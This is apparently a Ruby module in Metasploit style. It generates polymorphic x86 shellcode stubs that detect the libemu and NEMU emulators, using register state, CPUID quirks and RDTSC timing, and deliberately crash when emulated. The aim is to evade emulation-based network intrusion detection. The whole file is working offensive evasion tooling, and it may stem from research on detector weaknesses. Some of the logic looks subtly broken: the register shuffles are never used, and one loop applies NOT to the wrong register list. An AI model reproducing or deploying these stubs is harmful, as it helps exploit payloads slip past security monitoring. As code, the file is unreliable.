# -*- coding: binary -*-

# =============================================================
# Emulator-detection based anti-emulation armoring classes
#
# @Author: Jos Wetzels
# =============================================================

require 'ebnids/ebnids'
require 'ebnids/getpc'
require 'rex/poly'
require 'rex/arch'
require 'rex/text'

module Ebnids

  # Anti-emulation armoring class using libemu detection
  class DetectLibemu < AntiEmulArmor

    def initialize
      super(
        'Name'             => 'Libemu detection',  
        'ID'               => 1,             
        'Description'      => 'Anti-emulation armor integrating libemu detection',
        'Author'           => 'Jos Wetzels',   
        'License'          => MSF_LICENSE,   
        'Target'           => 'libemu',             
        'SizeIncrease'     => 0,         
        'isGetPC'          => 1,
        'hasEncoder'       => 0,
        'Conflicts'        => [],             
        'PreDeps'          => [],             
        'PostDeps'         => [])             
    end

    #
    # getPC stub incorporating libemu detection (based on the fact that all GP registers are initialized to zero)
    #
    # [+] Features:
    #       + Lightly polymorphic (randomized register subtraction & addiction order + polymorphic getPC code)
    #
    # [-] Limitations:
    #       - This only works when executed as the very first part of the shellcode, since it relies on libemu GP register state immediately after initialization
    #
    # [*] Note:
    #       - This can be futher improved by polymorphizing both the way in which we check that all GP registers are equal and the way in which we incorporate the result in the decoder stub
    #
    def getPCStub(getPCDestReg)
      badchars = @module_metadata['badchars']
      stub = ""

      # First subtract GP registers from eachother (all will subsequently be 0 in the case of libemu)
      gp_regs = Array[Rex::Arch::X86::EAX, Rex::Arch::X86::ECX, Rex::Arch::X86::EDX, Rex::Arch::X86::EBX, Rex::Arch::X86::ESI, Rex::Arch::X86::EDI]

      # Generate random subtraction order for GP registers
      gp_regs.shuffle

      for i in 0..5
        if i == 5
          stub = stub + Rex::Arch::X86.sub_reg(gp_regs[i], gp_regs[i])
        else
          stub = stub + Rex::Arch::X86.sub_reg(gp_regs[i], gp_regs[i+1])
        end
      end

      # Randomly choose cumulative result GP register gp_check

      index = Random.rand(6)
      gp_check = gp_regs[index]

      # Then add GP registers in random addition order to gp_check (cumulative result will be 0 on libemu)

      for i in 0..5
        # Don't add self to self
        if i != index
          stub = stub + Rex::Arch::X86.add_reg(gp_check, gp_regs[i])
        end
      end

      # Build stack-based getPC code, store PC in getPCDestReg
      stub = stub + "\x68" + Ebnids::GetPCStub.stackGetPC(getPCDestReg, badchars) # push (getPC_Stub)

      # Conditionally execute getPC code if gp_check register != 0 (ie. we're not emulated by libemu), else we make call to invalid memory address

      index = Random.rand(6)
      callReg = gp_regs[index]

      stub = stub + Rex::Arch::X86.test_reg(gp_check, gp_check) # set zero flag if gp_check == 0 (ie. we're emulated by libemu)
      stub = stub + "\x0F\x45" + (0xC4 + (8 * callReg)).chr # CMOVNE reg, ESP
      stub = stub + Rex::Arch::X86.call_reg(callReg)

      return stub
    end

  end

  # Anti-emulation armoring class using GP-register based NEMU detection
  class DetectNEMU_GP < AntiEmulArmor

    def initialize
      super(
        'Name'             => 'NEMU GP register detection',  
        'ID'               => 2,             
        'Description'      => 'Anti-emulation armor integrating GP-register based NEMU detection',
        'Author'           => 'Jos Wetzels',   
        'License'          => MSF_LICENSE,   
        'Target'           => 'nemu',             
        'SizeIncrease'     => 0,    
        'isGetPC'          => 1, 
        'hasEncoder'       => 0,
        'Conflicts'        => [],             
        'PreDeps'          => [],             
        'PostDeps'         => [])             
    end

    #
    # getPC stub incorporating NEMU detection (based on the fact that all GP registers are initialized to the same constant)
    #
    # [+] Features:
    #       + Lightly polymorphic (randomized register subtraction & addiction order + polymorphic getPC code)
    #
    # [-] Limitations:
    #       - Technique only works when executed as the very first part of the shellcode, since it relies on NEMU GP register state immediately after initialization
    #
    # [*] Note:
    #       - This can be futher improved by polymorphizing both the way in which we check that all GP registers are equal and the way in which we incorporate the result in the decoder stub
    #
    def getPCStub(getPCDestReg)
      badchars = @module_metadata['badchars']
      stub = ""

      # First XOR GP registers with eachother (all will subsequently be 0 in the case of NEMU)
      gp_regs = Array[Rex::Arch::X86::EAX, Rex::Arch::X86::ECX, Rex::Arch::X86::EDX, Rex::Arch::X86::EBX, Rex::Arch::X86::ESI, Rex::Arch::X86::EDI]

      # Generate random XOR order for GP registers
      gp_regs.shuffle

      # Choose random (because of shuffle) GP register gp_check for result storage
      gp_check = gp_regs[0]

      for i in 1..5
        stub = stub + Rex::Arch::X86.xor_reg(gp_check, gp_regs[i])
      end

      # XOR storage register with constant
      stub = stub + Rex::Arch::X86.xor(gp_check, 0x2F769097)

      # Build stack-based getPC code, store PC in getPCDestReg
      stub = stub + "\x68" + Ebnids::GetPCStub.stackGetPC(getPCDestReg, badchars) # push (getPC_Stub)

      # Conditionally execute getPC code if gp_check register != 0 (ie. we're not emulated by nemu), else we make call to invalid memory address
      index = Random.rand(6)
      callReg = gp_regs[index]

      stub = stub + Rex::Arch::X86.test_reg(gp_check, gp_check) # set zero flag if gp_check == 0 (ie. we're emulated by nemu)
      stub = stub + "\x0F\x45" + (0xC4 + (8 * callReg)).chr # CMOVNE reg, ESP
      stub = stub + Rex::Arch::X86.call_reg(callReg)

      return stub
    end

  end

  # Anti-emulation armoring class using CPUID based NEMU detection
  class DetectNEMU_CPUID < AntiEmulArmor

    def initialize
      super(
        'Name'             => 'NEMU CPUID instruction detection',  
        'ID'               => 3,             
        'Description'      => 'Anti-emulation armor integrating CPUID-instruction based NEMU detection',
        'Author'           => 'Jos Wetzels',   
        'License'          => MSF_LICENSE,   
        'Target'           => 'nemu',             
        'SizeIncrease'     => 0,    
        'isGetPC'          => 1, 
        'hasEncoder'       => 0,
        'Conflicts'        => [],             
        'PreDeps'          => [],             
        'PostDeps'         => [])             
    end

    #
    # getPC stub incorporating NEMU detection (based on the fact that NEMU incorrectly emulates the CPUID instruction)
    #
    # [+] Features:
    #       + Lightly polymorphic (randomized register subtraction & addiction order + polymorphic getPC code)
    #
    # [*] Note:
    #       - This can be futher improved by polymorphizing both the way in which we set all GP registers to zero and the way in which we incorporate the result in the decoder stub
    #
    def getPCStub(getPCDestReg)
      badchars = @module_metadata['badchars']
      stub = ""

      # We will set all registers to 0
      gp_regs = Array[Rex::Arch::X86::EAX, Rex::Arch::X86::ECX, Rex::Arch::X86::EDX, Rex::Arch::X86::EBX, Rex::Arch::X86::ESI, Rex::Arch::X86::EDI]

      # Generate random zero'ing order for GP registers
      gp_regs.shuffle
      
      # Directly zero first register
      stub = stub + Rex::Arch::X86.set(gp_regs[0], 0, badchars)

      for i in 1..5
        if (Random.rand(2) == 0)
          # set register directly to 0
          stub = stub + Rex::Arch::X86.set(gp_regs[i], 0, badchars)
        else
          # set register equal to a randomly selected previously zero'd register
          stub = stub + Rex::Arch::X86.mov_reg(gp_regs[i], gp_regs[Random.rand(i)])
        end
      end

      # CPUID
      stub = stub + "\x0F\xA2"

      # Only do EAX, ECX, EDX, EBX because they are affected by CPUID
      test_regs = Array[Rex::Arch::X86::EAX, Rex::Arch::X86::ECX, Rex::Arch::X86::EDX, Rex::Arch::X86::EBX]

      # Randomize order
      test_regs.shuffle

      # NOT reg
      for i in 0..3
        stub = stub + "\xF7" + (0xD0 | gp_regs[i]).chr
      end

      # Re-randomize order
      test_regs.shuffle

      # XOR checkReg, reg
      for i in 1..3
        stub = stub + Rex::Arch::X86.xor_reg(test_regs[0], test_regs[i])
      end

      # Build stack-based getPC code, store PC in getPCDestReg
      stub = stub + "\x68" + Ebnids::GetPCStub.stackGetPC(getPCDestReg, badchars) # push (getPC_Stub)

      # Conditionally execute getPC code if test_regs[0] register != 0 (ie. we're not emulated by nemu), else we make call to invalid memory address
      index = Random.rand(6)
      callReg = gp_regs[index]

      stub = stub + Rex::Arch::X86.test_reg(test_regs[0], test_regs[0]) # set zero flag if test_regs[0] == 0 (ie. we're emulated by nemu)
      stub = stub + "\x0F\x45" + (0xC4 + (8 * callReg)).chr # CMOVNE reg, ESP
      stub = stub + Rex::Arch::X86.call_reg(callReg)

      return stub
    end

  end

  # Anti-emulation armoring class using generic timing-based emulator detection
  class DetectTiming < AntiEmulArmor

    def initialize
      super(
        'Name'             => 'Timing-based emulator detection',  
        'ID'               => 4,             
        'Description'      => 'Anti-emulation armor integrating timing-based detection',
        'Author'           => 'Jos Wetzels',   
        'License'          => MSF_LICENSE,   
        'Target'           => '',             
        'SizeIncrease'     => 0,  
        'isGetPC'          => 1,  
        'hasEncoder'       => 0,          
        'Conflicts'        => [],             
        'PreDeps'          => [],             
        'PostDeps'         => [])             
    end

    #
    # getPC stub incorporating timing-based emulator detection
    #
    #
    # [*] Note:
    #       - This can be futher improved by making it polymorphic
    #
    def getPCStub(getPCDestReg)
      badchars = @module_metadata['badchars']
      stub = ""

      gp_regs = Array[Rex::Arch::X86::EAX, Rex::Arch::X86::ECX, Rex::Arch::X86::EDX, Rex::Arch::X86::EBX, Rex::Arch::X86::ESI, Rex::Arch::X86::EDI]
      # init loop counter
      stub = stub + Rex::Arch::X86.sub(-2, Rex::Arch::X86::ECX, badchars) # ecx => 0 ; sub ecx,-2 => ecx = 2

      # loop_start

        # store loop counter
        stub = stub + Rex::Arch::X86.push_reg(Rex::Arch::X86::ECX)

        # CPUID to serialize to prevent out-of-order execution
        stub = stub + "\x0F\xA2"

        # RDTSC to read clock
        stub = stub + "\x0F\x31"

        # restore counter garbled by CPUID instruction
        stub = stub + "\x8B" + (0x04 + (Rex::Arch::X86::ECX * 8)).chr + "\x24" # mov ecx, [esp]

        # TSC in EDX:EAX, consider only first 3 bytes of lower order bits (in eax) because loop wont run long enough to affect EDX
        stub = stub + Rex::Arch::X86.push_reg(Rex::Arch::X86::EAX)

        # start_check

          # check loop iteration
          stub = stub + "\x83\xF9\x02" # cmp ecx, 2

          # jb second_pass
          stub = stub + Rex::Arch::X86.jb(0x0C)

          # first_pass

            stub = stub + Rex::Arch::X86.sub(-0xFF, Rex::Arch::X86::ECX, badchars) # ecx => 0 ; sub ecx,-0xFF => ecx = 0xFF

            # first_loop
              # NOP
              stub = stub + "\x90"
            # loop first_loop
            stub = stub + Rex::Arch::X86.loop(-3)

            # jmp end_check
            stub = stub + Rex::Arch::X86.jmp_short(14)

          # second_pass

            stub = stub + Rex::Arch::X86.sub(-0xFF, Rex::Arch::X86::ECX, badchars) # ecx => 0 ; sub ecx,-0xFF => ecx = 0xFF

            # second_loop
              # lea eax, [eax + ecx]
              stub = stub + "\x8D\x04\x08"
              # imul ecx
              stub = stub + "\xF7\xE9"
            # loop second_loop
            stub = stub + Rex::Arch::X86.loop(-7) # loop loop_start

        # end_check
  
        # RDTSCP to read clock second time (guarantee all code in between has been executed)
        stub = stub + "\x0F\x01\xF9"

        # TSC in EDX:EAX, consider only first 3 bytes of lower order bits (in eax) because loop wont run long enough to affect EDX
        stub = stub + Rex::Arch::X86.push_reg(Rex::Arch::X86::EAX)

        # CPUID to serialize to prevent out-of-order execution
        stub = stub + "\x0F\xA2"

        # eax = new eax
        stub = stub + Rex::Arch::X86.pop_dword(Rex::Arch::X86::EAX) 
        # edx = old eax
        stub = stub + Rex::Arch::X86.pop_dword(Rex::Arch::X86::EDX)       
        # eax = diff in eax
        stub = stub + Rex::Arch::X86.sub_reg(Rex::Arch::X86::EAX, Rex::Arch::X86::EDX)       
        
        # only interested in first 3 bytes of DWORD (too accurate measurements would yield an unacceptable false positive rate)
        stub = stub + "\xC1\xE8\x08" # SHR eax,8

        stub = stub + Rex::Arch::X86.pop_dword(Rex::Arch::X86::ECX)

        # check loop iteration
        stub = stub + "\x83\xF9\x02" # cmp ecx, 2

        # store first pass at esi
        stub = stub + "\x0F\x44" + (0xC0 + (8 * Rex::Arch::X86::ESI) + Rex::Arch::X86::EAX).chr # CMOVE esi, EAX
        # store second pass at edi
        stub = stub + "\x0F\x45" + (0xC0 + (8 * Rex::Arch::X86::EDI) + Rex::Arch::X86::EAX).chr # CMOVNE edi, EAX

      stub = stub + Rex::Arch::X86.loop(-65) # loop loop_start

      # esi ~ 12
      # edi ~ 16

      # edx needs to be zero for division
      stub = stub + Rex::Arch::X86.set(Rex::Arch::X86::EDX, 0, badchars)
      # 2nd pass
      stub = stub + Rex::Arch::X86.mov_reg(Rex::Arch::X86::EAX,Rex::Arch::X86::EDI,)
      # eax = 2nd/1st passes
      stub = stub + "\xF7\xFE" # IDIV ESI

      # eax ~ 1

      index = Random.rand(6)
      callReg = gp_regs[index]

      # Build stack-based getPC code, store PC in getPCDestReg
      stub = stub + "\x68" + Ebnids::GetPCStub.stackGetPC(getPCDestReg, badchars) # push (getPC_Stub)

      # Conditionally execute getPC code if eax <= 5 (ie. we're not emulated), else we make call to invalid memory address
      stub = stub + "\x83\xF8\x06" # CMP EAX, (1+5)
      stub = stub + "\x0F\x4E" + (0xC4 + (8 * callReg)).chr # CMOVLE reg, ESP
      stub = stub + Rex::Arch::X86.call_reg(callReg)

      return stub
    end

  end

end
